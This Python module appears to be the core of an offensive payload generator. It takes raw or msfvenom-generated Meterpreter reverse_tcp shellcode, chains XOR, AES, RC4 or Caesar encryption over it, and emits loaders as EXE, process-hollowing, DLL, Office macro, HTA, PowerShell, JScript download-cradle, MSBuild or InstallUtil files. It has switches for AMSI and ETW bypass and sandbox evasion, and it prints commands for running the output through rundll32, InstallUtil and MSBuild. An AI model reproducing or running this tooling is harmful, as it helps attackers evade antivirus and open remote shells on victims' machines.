import sys

from . import shellcode, crypt, emit


# format -> set of supported encryption methods
COMPAT = {
    'exe':         {'xor', 'aes', 'rc4', 'caesar'},
    'hollow':      {'xor', 'aes', 'rc4', 'caesar'},
    'dll':         {'xor', 'aes', 'rc4', 'caesar'},
    'macro':       {'xor', 'caesar'},
    'hta':         {'xor', 'caesar'},
    'ps1':         {'xor', 'aes', 'rc4', 'caesar'},
    'js':          set(),  # download cradle, no encryption
    'msbuild':     {'xor', 'aes', 'rc4', 'caesar'},
    'installutil': {'xor', 'aes', 'rc4', 'caesar'},
    'stealth':     {'xor', 'aes', 'rc4', 'caesar'},
}


def validate(args):
    # validate combo
    fmt = args.format

    if fmt not in COMPAT:
        print(f'[!] unknown format: {fmt}', file=sys.stderr)
        print(f'    available: {", ".join(sorted(COMPAT.keys()))}', file=sys.stderr)
        sys.exit(1)

    methods = args.encrypt.split(',') if args.encrypt else []

    if fmt == 'js' and methods:
        print('[!] jscript format is a download cradle -- encryption not supported', file=sys.stderr)
        print('    use --url to set the payload URL', file=sys.stderr)
        sys.exit(1)

    allowed = COMPAT[fmt]
    for m in methods:
        if m not in crypt.METHODS:
            print(f'[!] unknown encryption: {m}', file=sys.stderr)
            print(f'    available: {", ".join(sorted(crypt.METHODS.keys()))}', file=sys.stderr)
            sys.exit(1)
        if m not in allowed:
            print(f'[!] {fmt} format does not support {m} encryption', file=sys.stderr)
            print(f'    {fmt} supports: {", ".join(sorted(allowed))}', file=sys.stderr)
            sys.exit(1)

    # need either -i (input file) or -l/-p (msfvenom)
    if fmt != 'js':
        if not args.input and not (args.lhost and args.lport):
            print('[!] provide shellcode via -i FILE or generate with -l LHOST -p LPORT', file=sys.stderr)
            sys.exit(1)

    return methods


def run(args):
    methods = validate(args)
    fmt = args.format

    # load shellcode
    if fmt == 'js':
        # jscript is just a download cradle
        sc = b''
        meta_chain = [{'method': 'none', 'out_len': 0}]
        encrypted = b''
    elif args.input:
        # detect format: if it looks like C# hex, parse as csharp
        from pathlib import Path
        raw = Path(args.input).read_bytes()
        try:
            text = raw.decode('utf-8', errors='strict')
            if '0x' in text and ',' in text:
                sc = shellcode.from_csharp(text)
                print(f'[+] parsed {len(sc)} bytes from csharp format', file=sys.stderr)
            elif all(c in '0123456789abcdefABCDEF \n\r\\x' for c in text.strip()):
                sc = shellcode.from_hex(text)
                print(f'[+] parsed {len(sc)} bytes from hex', file=sys.stderr)
            else:
                sc = raw
                print(f'[+] loaded {len(sc)} bytes from raw file', file=sys.stderr)
        except (UnicodeDecodeError, ValueError):
            sc = raw
            print(f'[+] loaded {len(sc)} bytes from raw file', file=sys.stderr)
    else:
        payload = args.payload or 'windows/x64/meterpreter/reverse_tcp'
        sc = shellcode.from_msfvenom(args.lhost, args.lport, payload)

    # encrypt
    if fmt != 'js':
        user_key = bytes.fromhex(args.key) if getattr(args, 'key', None) else None
        encrypted, meta_chain = crypt.chain(sc, methods, key=user_key)
        if methods:
            print(f'[+] encrypted: {" -> ".join(methods)} ({len(sc)}b -> {len(encrypted)}b)',
                  file=sys.stderr)

    # emit
    rendered = emit.render(
        fmt, encrypted, meta_chain,
        amsi=args.amsi, etw=getattr(args, 'etw', False),
        sandbox=args.sandbox,
        payload_url=getattr(args, 'url', ''),
    )

    # TODO: --staged flag to dump .bin intermediates for debugging
    # output
    if args.output:
        with open(args.output, 'w') as f:
            f.write(rendered)
        print(f'[+] wrote {args.output}', file=sys.stderr)
    else:
        print(rendered)

    # print compile hints for C# formats
    if fmt in ('exe', 'hollow', 'stealth') and args.output:
        print(f'\n[*] compile: mcs -out:{args.output.replace(".cs", ".exe")} {args.output}',
              file=sys.stderr)
    elif fmt == 'dll' and args.output:
        print(f'\n[*] compile: mcs -target:library -out:{args.output.replace(".cs", ".dll")} {args.output}',
              file=sys.stderr)
        print(f'    run:     rundll32 {args.output.replace(".cs", ".dll")},Run', file=sys.stderr)
    elif fmt == 'installutil' and args.output:
        print(f'\n[*] compile: mcs -target:library -out:{args.output.replace(".cs", ".dll")} {args.output}',
              file=sys.stderr)
        print(f'    run:     InstallUtil.exe /logfile= /LogToConsole=false /U {args.output.replace(".cs", ".dll")}',
              file=sys.stderr)
    elif fmt == 'msbuild' and args.output:
        print(f'\n[*] run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {args.output}',
              file=sys.stderr)
